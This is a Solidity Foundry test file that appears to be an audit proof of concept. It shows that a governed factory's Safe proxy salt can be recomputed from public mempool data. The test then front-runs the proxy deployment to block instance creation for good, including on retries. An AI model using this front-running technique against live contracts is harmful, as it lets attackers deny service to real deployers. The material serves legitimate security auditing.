// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {GnosisSafe} from "@gnosis.pm/safe-contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/proxies/GnosisSafeProxyFactory.sol";

import {GovernedTrustgraphsFactory} from "src/factory/GovernedTrustgraphsFactory.sol";
import {
    GovernedAuthorityDeployer,
    MerkleGovModuleDeployer,
    SignerSyncModuleDeployer
} from "src/factory/InstanceDeployers.sol";
import {TrustgraphsFactory} from "src/factory/TrustgraphsFactory.sol";
import {TrustgraphsFactoryBase} from "test/unit/factory/TrustgraphsFactoryBase.sol";

/// @notice Audit PoC (execution-trace pass): `GovernedTrustgraphsFactory._createBootstrapSafe`
///         derives the Safe proxy's CREATE2 salt from public, mempool-visible values only
///         (`chainid`, `msg.sender`, `name`, `salt`) and the initializer is a fixed constant.
///         Anyone can therefore deploy that exact proxy first, and the victim's
///         `createGovernedInstance` reverts inside Safe's `Create2 call failed` forever for that
///         (creator, name, salt) triple.
contract PashovTrace_GovernedSafeFrontRun is TrustgraphsFactoryBase {
    address internal constant SENTINEL_OWNERS = address(0x1);

    GovernedTrustgraphsFactory internal governedFactory;
    GnosisSafe internal safeSingleton;
    GnosisSafeProxyFactory internal safeFactory;
    GovernedAuthorityDeployer internal authorityDeployer;
    SignerSyncModuleDeployer internal signerSyncDeployer;
    MerkleGovModuleDeployer internal govModuleDeployer;

    address internal creator = address(0xA11CE);
    address internal griefer = address(0x6816F);

    function setUp() public override {
        super.setUp();
        safeSingleton = new GnosisSafe();
        safeFactory = new GnosisSafeProxyFactory();
        authorityDeployer = new GovernedAuthorityDeployer();
        signerSyncDeployer = new SignerSyncModuleDeployer();
        govModuleDeployer = new MerkleGovModuleDeployer();
        governedFactory = new GovernedTrustgraphsFactory(
            factory, safeFactory, address(safeSingleton), authorityDeployer, signerSyncDeployer, govModuleDeployer
        );
    }

    function _noPolicy() internal pure returns (GovernedTrustgraphsFactory.InitialPolicy memory) {
        return GovernedTrustgraphsFactory.InitialPolicy({minPaidIntervalBlocks: 0, maxPerRootUsd: 0});
    }

    function _noSigner() internal pure returns (GovernedTrustgraphsFactory.SignerSyncConfig memory) {
        return GovernedTrustgraphsFactory.SignerSyncConfig({
            enabled: false,
            verifier: address(0),
            programVKey: bytes32(0),
            topN: 0,
            minThreshold: 0,
            targetThresholdBps: 0
        });
    }

    /// The wrapper's bootstrap initializer, byte-for-byte (`_createBootstrapSafe`).
    function _bootstrapInitializer() internal view returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = address(governedFactory);
        return abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            1,
            address(0),
            bytes(""),
            address(0),
            address(0),
            0,
            address(0)
        );
    }

    function test_AnyoneCanPermanentlyBlockAGovernedCreation() public {
        TrustgraphsFactory.CreateArgs memory args = _args("acme-dao");
        args.salt = bytes32(uint256(1));

        // The griefer reads the victim's pending calldata and recomputes the bootstrap nonce.
        uint256 nonce = uint256(keccak256(abi.encode(block.chainid, creator, args.name, args.salt)));

        vm.prank(griefer);
        safeFactory.createProxyWithNonce(address(safeSingleton), _bootstrapInitializer(), nonce);

        // The victim's transaction now reverts inside GnosisSafeProxyFactory: the CREATE2 address
        // is occupied, `create2` returns 0, and `require(address(proxy) != address(0))` fires.
        vm.prank(creator);
        vm.expectRevert(bytes("Create2 call failed"));
        governedFactory.createGovernedInstance(args, _noPolicy(), _noSigner());

        // Retrying is not a fix: every retry publishes the (name, salt) the griefer needs.
        args.salt = bytes32(uint256(2));
        uint256 nonce2 = uint256(keccak256(abi.encode(block.chainid, creator, args.name, args.salt)));
        vm.prank(griefer);
        safeFactory.createProxyWithNonce(address(safeSingleton), _bootstrapInitializer(), nonce2);
        vm.prank(creator);
        vm.expectRevert(bytes("Create2 call failed"));
        governedFactory.createGovernedInstance(args, _noPolicy(), _noSigner());
    }
}
